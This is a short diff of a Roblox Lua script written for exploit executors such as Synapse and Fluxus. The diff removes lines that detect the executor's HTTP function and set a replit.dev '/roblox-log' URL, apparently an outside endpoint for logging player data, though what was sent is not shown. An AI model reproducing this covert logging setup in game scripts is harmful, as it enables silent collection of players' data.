@@ -1,12 +1,3 @@
-local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-
-if not httpRequest then
-    warn("Bu executor HTTP isteklerini desteklemiyor!")
-    return
-end
-
-local url = "https://fbd01916-b12c-4056-b9d0-08d3b995a67e-00-3c4ti1x37m2zy.sisko.replit.dev/roblox-log"
-
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local HttpService = game:GetService("HttpService")
@@ -488,3 +479,4 @@ task.spawn(function()
         task.wait(0.05)
     end
 end)
+
